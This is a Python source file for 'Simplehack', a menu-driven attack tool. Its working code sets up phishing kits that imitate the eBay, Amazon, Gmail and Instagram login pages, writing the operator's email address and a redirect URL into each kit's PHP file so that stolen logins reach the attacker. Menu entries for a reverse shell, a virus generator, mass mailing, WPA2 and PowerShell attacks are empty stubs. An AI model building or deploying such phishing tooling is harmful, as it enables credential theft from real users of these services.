from pyfiglet import Figlet
from shutil import copyfile
import shutil
import os



class website_attack():

    def __init__(self):
        print("Please choose the webpage.")
        print("")
        print("1) Ebay")
        print("2) Amazon")
        print("3) gmail")
        print("4) instagram")

        choosen_webside = int(input(""))

        if choosen_webside == 1:
            self.ebay_attack()
        elif choosen_webside == 2:
            self.amazon_attack()
        elif choosen_webside == 3:
            self.gmail_attack()
        elif choosen_webside == 4:
            self.insta_attack()


    def ebay_attack(self):
        phishing_email = input("Please enter your email: ")
        storage_location = input("Please enter the storage location: ")
        redirect_location = input("Please enter the redirect location (for default type: d): ")

        shutil.copytree('phishing/ebay/', storage_location)


        path = storage_location + "/modify.php"

        # Read in the file
        with open(path, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace('someone@example.com', phishing_email)

        if redirect_location != "d":
            filedata = filedata.replace('https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=http%3A%2F%2Fwww.ebay.com%2F', redirect_location)

        # Write the file out again
        with open(path, 'w') as file:
            file.write(filedata)

        print("Complete...")

    def amazon_attack(self):

        phishing_email = input("Please enter your email: ")
        storage_location = input("Please enter the storage location: ")
        redirect_location = input("Please enter the redirect location (for default type: d): ")

        shutil.copytree('phishing/amazon/', storage_location)


        path = storage_location + "/validate.php"

        # Read in the file
        with open(path, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace('someone@example.com', phishing_email)

        if redirect_location != "d":
            filedata = filedata.replace('https://www.amazon.com/dp/B01E6AO69U/ref=ods_gw_ha_d_white?pf_rd_p=4a14e6ce-9ad7-4d30-8874-2e112490a43e&pf_rd_r=E58SKPFF5RA13KW7JQ3M', redirect_location)

        # Write the file out again
        with open(path, 'w') as file:
            file.write(filedata)

        print("Complete...")

    def gmail_attack(self):

        phishing_email = input("Please enter your email: ")
        storage_location = input("Please enter the storage location: ")
        redirect_location = input("Please enter the redirect location (for default type: d): ")

        shutil.copytree('phishing/gmail/', storage_location)


        path = storage_location + "/redirect.php"

        # Read in the file
        with open(path, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace('someone@example.com', phishing_email)

        if redirect_location != "d":
            filedata = filedata.replace('https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view', redirect_location)

        # Write the file out again
        with open(path, 'w') as file:
            file.write(filedata)

        print("Complete...")

    def insta_attack(self):

        phishing_email = input("Please enter your email: ")
        storage_location = input("Please enter the storage location: ")
        redirect_location = input("Please enter the redirect location (for default type: d): ")

        shutil.copytree('phishing/instagram/', storage_location)


        path = storage_location + "/login.php"

        # Read in the file
        with open(path, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace('someone@example.com', phishing_email)

        if redirect_location != "d":
            filedata = filedata.replace('https://instagram.com', redirect_location)

        # Write the file out again
        with open(path, 'w') as file:
            file.write(filedata)

        print("Complete...")




def reverse_attack():
    pass

def virus_attack():
    pass

def mail_attack():
    pass

def wlan_attack():
    pass

def powershell_attack():
    pass



def main_menu():
    os.system("color a")
    f = Figlet(font='slant')
    rend_text = f.renderText('Simplehack')
    print(rend_text)
    print("----------------- Created by Dante -----------------")
    print("")
    print("Please choose an option: ")
    print("")
    print("1) Website phishing attack")
    print("2) Reverse shell attack")
    print("3) Virus generator")
    print("4) Mass Mailer attacks")
    print("5) WLAN Attack (WPA2)")
    print("6) Powershell attack")
    print("")
    print("99) Exit")

    choose_attack = int(input())

    if choose_attack == 1:
        website_attack()
    elif choose_attack == 2:
        reverse_attack()
    elif choose_attack == 3:
        virus_attack()
    elif choose_attack == 4:
        mail_attack()
    elif choose_attack == 5:
        wlan_attack()
    elif choose_attack == 6:
        powershell_attack()
    elif choose_attack == 99:
        quit("Bye!")


main_menu()